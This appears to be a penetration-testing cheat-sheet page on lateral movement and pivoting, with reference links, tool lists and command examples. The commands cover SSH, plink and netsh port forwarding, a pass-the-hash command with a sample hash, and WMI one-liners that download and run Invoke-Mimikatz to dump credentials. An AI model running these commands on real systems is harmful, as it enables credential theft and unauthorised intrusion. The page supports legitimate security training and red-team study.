# Lateral Movement

## Lateral Movement and Pivoting

Lateral movement is where an attacker moves within a network to gain access to additional systems. This type of attack is commonly referred to as “pivoting” because the attacker “pivots” from one system to another. The purpose of lateral movement is to gain access to additional systems and data, or to use the compromised systems as a way to launch further attacks.

The two primary methods of lateral movement are credential-based and non-credential-based. In credential-based lateral movement, the attacker uses valid credentials to move from one system to another. This type of attack is often used to gain access to additional systems that the attacker would not have been able to access otherwise.

Non-credential-based lateral movement does not require the attacker to use valid credentials. Instead, the attacker uses methods such as exploiting vulnerabilities, using exploits, or scanning for open ports to gain access to the target system.

* [https://www.ired.team/offensive-security/lateral-movement](https://www.ired.team/offensive-security/lateral-movement)
* [https://xapax.github.io/security/#attacking\_active\_directory\_domain/remote\_access/remote\_access/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/remote\_access/remote\_access/)
* [PSExec Pass the Hash - Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)&#x20;
* [Lateral Movement via DCOM: Round 2 | enigma0x3](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [https://medium.com/@kuwaitison/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022](https://medium.com/@kuwaitison/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022)
* [http://pwnwiki.io/#!pivoting/linux/index.md](http://pwnwiki.io/#!pivoting/linux/index.md)
* [https://xapax.github.io/security/#random\_tips\_and\_tricks/pivoting/](https://xapax.github.io/security/#random\_tips\_and\_tricks/pivoting/)
* [https://pentest.blog/explore-hidden-networks-with-double-pivoting/](https://pentest.blog/explore-hidden-networks-with-double-pivoting/)
* [NetworkPivotingTechniques](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)
* _Attacking Network Protocols: Network Proxies - pg.20_

### Port Forwarding/Tunneling

Port forwarding, also known as tunneling, is a technique used to redirect incoming data traffic to a specific port or port range on a computer or network device. It is commonly used to allow remote users to access services on a local network, such as a web server, mail server, or other application.

The process involves recieving network traffic on one port, and redirecting it out another. This allows traffic that might be restricted or blocked over one port, to be allowed to pass over another.

* [Abachy's Port Forwarding Guide](https://www.abatchy.com/2017/01/port-forwarding-practical-hands-on-guide)&#x20;
* [https://fumenoid.github.io/posts/port-forwarding](https://fumenoid.github.io/posts/port-forwarding)
* [https://xapax.github.io/security/#random\_tips\_and\_tricks/port\_forwarding\_and\_tunneling/](https://xapax.github.io/security/#random\_tips\_and\_tricks/port\_forwarding\_and\_tunneling/)
* [https://www.offensive-security.com/metasploit-unleashed/portfwd/](https://www.offensive-security.com/metasploit-unleashed/portfwd/)
* [http://woshub.com/port-forwarding-in-windows/](http://woshub.com/port-forwarding-in-windows/)
* [https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html](https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html)
* [https://www.offensive-security.com/metasploit-unleashed/proxytunnels/](https://www.offensive-security.com/metasploit-unleashed/proxytunnels/)
* [https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/](https://chamibuddhika.wordpress.com/2012/03/21/ssh-tunnelling-explained/)
* [https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/](https://www.cynet.com/attack-techniques-hands-on/how-hackers-use-icmp-tunneling-to-own-your-network/)

## Pivoting Tools

{% tabs %}
{% tab title="PSEmpire" %}
* Powershell Empire tools
  * inveigh\_relay - SMB relay function
  * invoke\_executemsbuild - executes a powershell command on local/remote host using MSBuild.exe and an inline task.
  * invoke\_psremoting - executes a stager on remote hostss using PSRemoting. Victim must have PSRemoting enabled.
  * invoke\_sqloscmd - executes a command or stager on remote hosts using xp\_cmdshell
  * invoke\_wmi - execute a stager on remote hosts via WMI
  * jenkins\_script\_console - Deploys an empire agent against a Jenkins server with unauthed access to script console.
  * invoke\_dcom - invoke commands on remote hosts using MMC20.Application COM object over DCOM.
  * invoke\_psexec 0 executes a stager on remote host using PsExec type functionality. Oldy but a goodie
  * invoke\_smbexec - using samba tools
  * invoke\_sshcommand - executes a command on a remote host via SSH
  * Invoke\_wmi\_debugger - uses WMI to set the debugger for a target binary on a remote hosts to be cmd.exe or a stager
  * new\_gpo\_immediate\_task - Builds and immediate schtask to push through a specified GPO. mist have access to modify GPOs
    * [http://harmj0y.net/blog/empire/empire-1-5](http://harmj0y.net/blog/empire/empire-1-5)
  * _PTFM: Empire Admin Tools - pg. 52_
{% endtab %}

{% tab title="PSExec" %}
* Allows you to execute programs and code remotely using credentials
* Combine with Veil to create an obfuscated payload that can bypass AV
* _RTFM: PSExec Commands - pg. 18_
* Metasploit
  * \> use exploit/windows/smb/psexec\_psh
  * Use powershell encoded commands to mimic, ld psexec
  * It will spawn a meterpreter shell but will run in memory and not touch the disk. No need to create custom payload
{% endtab %}

{% tab title="CrackmapExec" %}
* CrackMapExec
  * Tool that sweep scans a local network with a set of harvested credentials to see what other services you can log into.
  * Built into Powershell Empire
  * Use permissions of an AD user to gain control of other systems
  * Empire module: situational\_awareness/network/powerview/find\_localadmin\_access \*\*\*Loud\*\*\*
{% endtab %}

{% tab title="Plink.exe" %}
Plink.exe&#x20;

* \>plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4&#x20;
  * \-ssh -connect via ssh&#x20;
  * 10.11.0.4 - kali IP&#x20;
  * \-l user&#x20;
  * \-pw password&#x20;
  * R remote port forward&#x20;
* \>cmd.exe /c echo y | plink.exe -ssh -l kali -pw ilak -R 10.11.0.4:1234:127.0.0.1:3306 10.11.0.4&#x20;
* The first time plink connects to a host, it will attempt to cache the host key in hte registry.&#x20;
* We need to pipe a command into the plink execution&#x20;
* Once finished, send commands out the 127.0.0.1 and forwarded port&#x20;
  * \# sudo nmap -sS -sV 127.0.0.1 -p 1234 • NETSH&#x20;
* After compromising a windows device and getting SYSTEM-level (to bypass UAC), we can use the netsh utility for portforwarding and pivoting.&#x20;
* The Windows dev must have the IP Helper service running and IPV6 enabled. Both are enabled by default&#x20;
  * \> netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.11.0.22 connectport=445 connectaddress=192.168.1.110&#x20;
* We can add firewall rules to allow out traffic outbound&#x20;
  * \> netsh advfirewall firewall add rule name="forward\_port\_rule" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow Ok.
{% endtab %}

{% tab title="Proxy Chains" %}
* \#cat /etc/proxychains.conf&#x20;
* \#sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110
* [How to set up ProxyChains - Stay Anonymous](lateral-movement.md#linux-ssh-tunneling)
* [How to set up ProxyChains - Change IP](https://youtu.be/FtFTh-KVjsA)
{% endtab %}

{% tab title="Other Tools" %}
* [sslh](https://www.kali.org/tools/sslh/) - sslh lets one accept HTTPS, SSH, OpenVPN, tinc and XMPP connections on the same port. This makes it possible to connect to any of these servers on port 443 (e.g. from inside a corporate firewall, which almost never block port 443) while still serving HTTPS on that port.
* [redsocks](https://www.kali.org/tools/redsocks/) - Redsocks is a daemon running on the local system, that will transparently tunnel any TCP connection via a remote SOCKS4, SOCKS5 or HTTP proxy server.
* [nextnet](https://www.kali.org/tools/nextnet/) - This package contains a pivot point discovery tool written in Go.
* [miredo](https://www.kali.org/tools/miredo/) - A client for the Teredo IPV6 tunneling protocol.
* [iodine](https://www.kali.org/tools/iodine/) - This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
* [dnschef](https://www.kali.org/tools/dnschef/) - DNSChef is a highly configurable DNS proxy for Penetration Testers and Malware Analysts.
* [dns2tcp](https://www.kali.org/tools/dns2tcp/) - dns2tcp is a set of tools to encapsulate a TCP session in DNS packets. This type of encapsulation generates smaller packets than IP-over-DNS, improving throughput.
* [cryptcat](https://www.kali.org/tools/cryptcat/) - Cryptcat is a simple Unix utility which reads and writes data across network connections, using TCP or UDP protocol while encrypting the data being transmitted.
* [chisel](https://www.kali.org/tools/chisel/) - This package contains a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.
* [PacketWhisper](https://github.com/TryCatchHCF/PacketWhisper) - PacketWhisper: Stealthily exfiltrate data and defeat attribution using DNS queries and text-based steganography. Avoid the problems associated with typical DNS exfiltration methods. Transfer data between systems without the communicating devices directly connecting to each other or to a common endpoint. No need to control a DNS Name Server.
* [Pivotnacci](https://github.com/blackarrowsec/pivotnacci) - Pivot into the internal network by deploying HTTP agents.
* [Mallory](https://github.com/justmao945/mallory) - HTTP/HTTPS proxy over SSH.
* [Iodine](https://github.com/yarrick/iodine) - This is a piece of software that lets you tunnel IPv4 data through a DNS server. This can be usable in different situations where internet access is firewalled, but DNS queries are allowed.
* [SSHuttle](https://github.com/sshuttle/sshuttle) - Where transparent proxy meets VPN meets ssh.
  * [https://sshuttle.readthedocs.io/en/stable/](https://sshuttle.readthedocs.io/en/stable/)&#x20;
* [Modaliska](https://github.com/drk1wi/Modlishka)  - Modlishka is a powerful and flexible HTTP reverse proxy. It implements an entirely new and interesting approach of handling browser-based HTTP traffic flow, which allows to transparently proxy multi-domain destination traffic, both TLS and non-TLS, over a single domain, without a requirement of installing any additional certificate on the client.
* [ProxyChains](https://github.com/haad/proxychains) - ProxyChains is a UNIX program, that hooks network-related libc functions in dynamically linked programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or HTTP proxies.
* [PivotSuite](https://github.com/RedTeamOperations/PivotSuite) - PivotSuite is a portable, platform independent and powerful network pivoting toolkit, Which helps Red Teamers / Penetration Testers to use a compromised system to move around inside a network.
* [keimpx](https://github.com/nccgroup/keimpx) - quickly check for valid credentials across a network over SMB.
* [Sonar.js](https://github.com/mandatoryprogrammer/sonar.js) - A framework for identifying and launching exploits against internal network hosts. Works via WebRTC IP enumeration combined with WebSockets and external resource fingerprinting.&#x20;
* [SprayWMI](https://github.com/trustedsec/spraywmi) - SprayWMI is a method for mass spraying [Unicorn](https://github.com/trustedsec/unicorn) PowerShell injection to CIDR notations.
* [LOLBAS](https://lolbas-project.github.io/) - Living Off The Land Binaries and Scripts (and also Libraries)
* [MalSCCM](https://github.com/nettitude/MalSCCM) - This tool allows you to abuse local or remote SCCM servers to deploy malicious applications to hosts they manage.
* [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) - Fileless lateral movement tool that relies on ChangeServiceConfigA to run commandG
{% endtab %}
{% endtabs %}

## Pivoting Techniques

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

{% tabs %}
{% tab title="Pass-The-Hash" %}
&#x20;[https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)

* Basic Local admin attack - the old way
  * Currently most local admin accounts are disabled by default and utilize LAPS to protect passwords
  * Requirements: local admin enabled, and RID is 500
  * If available we can run a a few modules to pull out those hashes.
  * Empire module: powershell/credentials/powerdump
  * Metasploit: [http://bit.ly/2qzsyDI](http://bit.ly/2qzsyDI)
* Breaking LAPS
  * metasploit - enum\_laps.rb
  * [https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/](https://room362.com/post/2017/dump-laps-passwords-with-ldapsearch/)
* pth-winexe
  * Pass the hash toolkit - modified winexe, performs auth using SMB
  * \# pth-winexe -U \[NTLM hash] \[SMB share] \[command to execute
  * \# pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
* [Performing Pass-the-hash Attacks With Mimikatz](https://blog.stealthbits.com/passing-the-hash-with-mimikatz)
* [How to Pass-the-Hash with Mimikatz](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/)
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* _PTFM: Metasploit/Emipre Pass-the-hash - pg. 52_
{% endtab %}

{% tab title="SSH Tunnel and Port Fwd" %}
* SSH local port forwarding.&#x20;
  * \# cat /root/port\_forwarding\_and\_tunneling/ssh\_local\_port\_forwarding.sh
  * \# ssh -N -L \[bind\_address:]port:host:hostport \[username@address]&#x20;
  * \# sudo ssh -N -L 0.0.0.0:445:192.168.1.110:445 student@10.11.0.128&#x20;
* SSH Remote port forwarding&#x20;
  * \# cat /root/port\_forwarding\_and\_tunneling/ssh\_remote\_port\_forwarding.sh ◇# ssh -N -R \[bind\_address:]port:host:hostport \[username@address]&#x20;
  * &#x20;ssh -N -R 10.11.0.4:2221:127.0.0.1:3306 kali@10.11.0.4&#x20;
* SSH Dynamic Port forwarding&#x20;
  * \# ssh -N -D : \<username>@&#x20;
  * \# sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
* [https://github.com/DennyZhang/cheatsheet-ssh-A4](https://github.com/DennyZhang/cheatsheet-ssh-A4)
* _Operator Handbook: SSH - pg.286_
{% endtab %}

{% tab title="Stealing Tokens" %}
* Stealing tokens
  * Metasploit Incognito - steal user tokens
  * Powershell Empire: steal\_tokens
  * Inject a new agent into a running process owned by a different user
    * PSInject - inject agent into processes using ReflectivePick to load up the .NET clanguage runtime into a process and execute a Powershell command without a new powershell.exe process
    * This will start a new agent running as a process owned by the new target.
    * [http://bit.ly/2HDxj6x](http://bit.ly/2HDxj6x)
{% endtab %}

{% tab title="Linux Port Fwd" %}
rinetd&#x20;

* \# sudo apt update && sudo apt install rinetd&#x20;
* The rinetd configuration file, /etc/rinetd.conf, lists forwarding rules that require four parameters, including bindaddress and bindport, which define the bound (“listening”) IP address and port, and connectaddress and connectport, which define the traffic’s destination address and port:&#x20;
* \# cat /etc/rinetd.conf&#x20;
* \# sudo service rinetd restart
{% endtab %}

{% tab title="WSUS" %}
* [Remote Weaponization of WSUS MITM](https://www.sixdub.net/?p=623)
* [WSUSpendu](https://www.blackhat.com/docs/us-17/wednesday/us-17-Coltel-WSUSpendu-Use-WSUS-To-Hang-Its-Clients-wp.pdf)
* [Leveraging WSUS – Part One](https://ijustwannared.team/2018/10/15/leveraging-wsus-part-one/)
{% endtab %}

{% tab title="DCOM" %}
* DCOM is a windows feature for communicating between software components on different remote machines
* These can be used when traditional options like WMI, Powershell remoting, and PSExec are being monitored.
* List all a machine's DCOM applications with powershell
  * Get-CimInstance Win32\_DCOMApplication
* There are many objects that allow remote code execution: ShellBrowserWindows, ShellWindows
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* _PTFM: DCOM- pg. 52_
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="HTTP Tunnel" %}
* Some DPI devices only allow specific protocols, like no SSH&#x20;
* HTTPTunnel&#x20;
  * \# apt-cache search httptunnel&#x20;
  * \# sudo apt install httptunnel&#x20;
  * \# hts --forward-port localhost:8888 1234 (Server-linux target) 0
* Set up server to listen on port 1234 and redirect to local 8888&#x20;
  * \# htc --forward-port 8080 10.11.0.128:1234 (Client-kali)&#x20;
* Set up client to send it to the listening server.
{% endtab %}

{% tab title="MSSQL DB Links" %}
* [SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!](https://blog.netspi.com/how-to-hack-database-links-in-sql-server/)
* [SQL Server Link Crawling with PowerUpSQL](https://blog.netspi.com/sql-server-link-crawling-powerupsql/)
{% endtab %}

{% tab title="Browser Pivot" %}
* Used to access an application that the user of the compromised workstation accesses regularly.
* This method can bypass authentication to that application
* Tasks: Inject code into IE process accessing the medical database, create a web proxy DLL based on the WnInet API, and passw eb traffic through our ssh tunnel and the new proxy
* Stage 1: DLL Injection - Injecting code into a currently running process
  * Attach to the target process
  * Allocate memory within the target process
  * Copy the DLL into the target process memory and calculate an appropriate memory addresses
  * Instruct target process to execute your DLLL
* Stage 2: Create a Proxy DLL based on the WinInet API
  * Any program can use the WinInet API, and it can handle tasks such as cookie and session managment, auth, etc...
  * WinInet API performs Auth on a per process basis
  * Inject our own proxy server into targets IE process and route our web traffic through it and inherit application session states. Including those with 2FA!
* Stage 3: Using the injected proxy server
  * Now we have an HTTP proxy running on our target machine and restructed it to the local ethernet int.
  * Next we must hardcode an additional tunnel into our payload.&#x20;
{% endtab %}

{% tab title="SCCM" %}
* [Targeted Workstation Compromise With Sccm](https://enigma0x3.net/2015/10/27/targeted-workstation-compromise-with-sccm/)
* [PowerSCCM - PowerShell module to interact with SCCM deployments](https://github.com/PowerShellMafia/PowerSCCM)


{% endtab %}

{% tab title="WMI" %}
* Once you have harvested credentials and elevated the session on your current target, you can send remote commands to other devices using WMI
* Remote Mimikatz attack
  * \> wmic /USER:"hacker\testuser1" /PASSWORD:"asdfasdfasdf!" /NODE:\[target ip] process call create “powershell.exe -exec bypass IEX (Net-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/Powersploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\\Users\\\public\\\a.txt”
  * dir\\\\\[target hostname]\c$\Users\Public\\
  * type\\\\\[target hostname]\c$\Users\Public\a.txt
  * del\\\\\[target hostname]\c$\Userse\Public\a.txt
* MassMimikatz - a better way to do the remote mimikatz attack
  * \> powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.Webclient).downloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1'); “'hostname1','hostname2' | Invoke-MassMimikatz -Verbose -FireWillRule”
{% endtab %}

{% tab title="Misc" %}
### **RDP Tunneling**

* _PTFM: RDP Tunneling - pg. 53_

### **NGINX for proxy**

* _PTFM: NGINX for proxy use- pg. 64_

### SSH Hijack

* _PTFM: SSH Hijack- pg. 110_

### Admin Shares

* _PTFM: Admin Shares - pg. 51_
{% endtab %}
{% endtabs %}
